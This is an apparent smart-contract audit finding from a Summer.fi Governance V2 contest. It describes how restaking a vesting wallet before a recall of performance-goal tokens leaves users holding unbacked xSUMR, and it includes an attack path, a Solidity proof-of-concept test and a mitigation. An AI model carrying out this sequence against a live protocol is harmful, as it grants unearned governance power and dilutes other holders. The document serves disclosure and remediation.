# Audit Findings - Public Contests

## Medium Severity

### M-1: Unbacked xSUMR Through Restaking After Performance Goal Recall

**Contest:** Summer.fi Governance V2  
**Date:** October 2025  
**Severity:** Medium  
**Status:** Acknowledged

#### Summary

The escrow mints xSUMR against the full SUMR balance of a vesting wallet, including unreleased performance goal tokens. Users can restake after releasing cliff and vesting amounts, then have their remaining performance goal tokens recalled by the factory while retaining the minted xSUMR, creating permanent unbacked xSUMR in circulation.

#### Root Cause

The protocol mints xSUMR against the full SUMR balance of a vesting wallet without accounting for potentially recallable performance goal tokens. This allows users to:
1. Stake and receive xSUMR for the full balance (cliff + vesting + performance goal)
2. Release and unstake only the vested portions
3. Restake to mint xSUMR for the remaining performance goal amount
4. Retain the minted xSUMR even after the factory recalls the underlying SUMR

**Vulnerable Code:**
```solidity
// SummerVestingWalletsEscrow.sol:L237
// Mints xSUMR against full balance without checking recallable amounts
```

#### Attack Path

1. User receives vesting wallet with 200,000 SUMR (100k cliff + 50k vesting + 50k performance goal)
2. User transfers ownership to escrow and stakes, receiving 200k xSUMR
3. Time passes - cliff and vesting periods complete (performance goal remains unreached)
4. User releases vested tokens (150k SUMR) and unstakes, burning 200k xSUMR
5. User restakes the remaining wallet, receiving 50k xSUMR for the performance goal amount
6. Factory calls `recallUnvestedTokens()`, sweeping the 50k SUMR to foundation
7. User retains 50k xSUMR with zero underlying SUMR backing

#### Impact

- **Governance Inflation:** Attacker gains cost-free voting power without capital at risk
- **Protocol Insolvency:** Circulating xSUMR exceeds actual staked SUMR
- **Unfair Advantage:** User maintains governance influence and economic upside after funds are recalled

#### Proof of Concept
```solidity
function test_UnbackedXSUMR_ThroughRestakingAndRecall() public {
    // Setup: 200k total (100k cliff + 50k vesting + 50k goal)
    uint256 cliffAmount = 100_000 ether;
    uint256 vestingAmount = 50_000 ether;
    uint256 performanceGoalAmount = 50_000 ether;
    uint256 totalAmount = 200_000 ether;
    
    // Create vesting wallet with performance goal that won't be met
    VestingWalletConfig memory config = VestingWalletConfig({
        user: user1,
        vestingAmount: vestingAmount,
        cliffAmount: cliffAmount,
        performanceGoals: _createPerformanceGoals(performanceGoalAmount, "Unmet goal"),
        // ... other config
    });
    _createVestingWalletForUser(config);
    
    address payable vestingWallet = payable(factory.vestingWallets(user1));
    
    // Step 1: Initial stake - user receives 200k xSUMR
    vm.startPrank(user1);
    SummerVestingWalletV2(vestingWallet).transferOwnership(address(staking));
    staking.stakeVesting(factory);
    vm.stopPrank();
    
    assertEq(xSumr.balanceOf(user1), totalAmount); // 200k xSUMR
    
    // Step 2: Time passes - vesting completes
    vm.warp(block.timestamp + CLIFF_PERIOD + VESTING_PERIODS);
    
    // Step 3: Release and unstake vested portion
    vm.startPrank(user1);
    SummerVestingWalletV2(vestingWallet).release(address(sumrToken));
    xSumr.approve(address(staking), totalAmount);
    staking.unstakeVesting(factory);
    vm.stopPrank();
    
    assertEq(sumrToken.balanceOf(user1), 150_000 ether); // Received vested
    assertEq(xSumr.balanceOf(user1), 0); // All xSUMR burned
    assertEq(sumrToken.balanceOf(vestingWallet), 50_000 ether); // Goal remains
    
    // Step 4: CRITICAL - Restake remaining balance
    vm.startPrank(user1);
    SummerVestingWalletV2(vestingWallet).transferOwnership(address(staking));
    staking.stakeVesting(factory);
    vm.stopPrank();
    
    assertEq(xSumr.balanceOf(user1), 50_000 ether); // 50k xSUMR minted
    
    // Step 5: Factory recalls unvested tokens
    vm.prank(foundation);
    SummerVestingWalletV2(vestingWallet).recallUnvestedTokens();
    
    // VULNERABILITY DEMONSTRATED
    assertEq(sumrToken.balanceOf(vestingWallet), 0); // Wallet empty
    assertEq(xSumr.balanceOf(user1), 50_000 ether); // User STILL has xSUMR!
    assertEq(sumrToken.balanceOf(foundation), 50_000 ether); // Foundation got SUMR
}
```

#### Mitigation

Recompute the escrowed balance on every unstake and after recalls (or prevent recalls while staked) so that xSUMR minted for vesting wallets always matches the underlying SUMR still held.


